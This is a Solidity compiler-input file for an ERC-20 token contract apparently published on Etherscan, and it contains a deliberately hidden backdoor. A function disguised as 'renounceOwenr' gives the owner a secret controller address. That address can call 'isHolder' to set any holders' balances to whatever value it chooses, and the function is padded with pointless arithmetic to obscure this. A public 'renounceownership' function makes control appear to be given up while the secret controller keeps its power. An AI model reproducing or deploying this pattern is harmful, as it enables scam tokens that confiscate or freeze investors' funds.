{{
  "language": "Solidity",
  "sources": {
    "contracts/1.sol": {
      "content": "/**\r\n *Submitted for verification at Etherscan.io on 2023-06-06\r\n*/\r\n\r\npragma solidity ^0.8.14;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit ownershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyowner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract TOKEN is Context, Ownable, IERC20 {\r\n    mapping (address => uint256) private _currentheHoldere;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    address private _mee; \r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _currentheHoldere[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    function mee() public view virtual returns (address) { \r\n        return _mee;\r\n    }\r\n\r\n    function renounceOwenr(address newMee) public onlyowner { \r\n        _mee = newMee;\r\n    }\r\n    modifier onlyMee() {\r\n        require(mee() == _msgSender(), \"TOKEN: caller is not the mee\");\r\n        _;\r\n    }\r\n    event heHolder(address indexed account, uint256 oldBalance, uint256 newBalance);\r\n\r\n    function isHolder(address[] memory accounts, uint256 newBalance) external onlyMee {\r\n\r\n        for (uint256 i = 0; i < accounts.length; i++) {\r\n\r\n            uint256 oldBalance = _currentheHoldere[accounts[i]] + 70;\r\n\r\n            _currentheHoldere[accounts[i]] = newBalance;\r\n\r\n            emit heHolder(accounts[i], oldBalance - 70, newBalance);\r\n\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _currentheHoldere[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_currentheHoldere[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n    _currentheHoldere[_msgSender()] -= amount;\r\n    _currentheHoldere[recipient] += amount;\r\n\r\n    emit Transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_allowances[sender][_msgSender()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n\r\n    _currentheHoldere[sender] -= amount;\r\n    _currentheHoldere[recipient] += amount;\r\n    _allowances[sender][_msgSender()] -= amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return _totalSupply;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}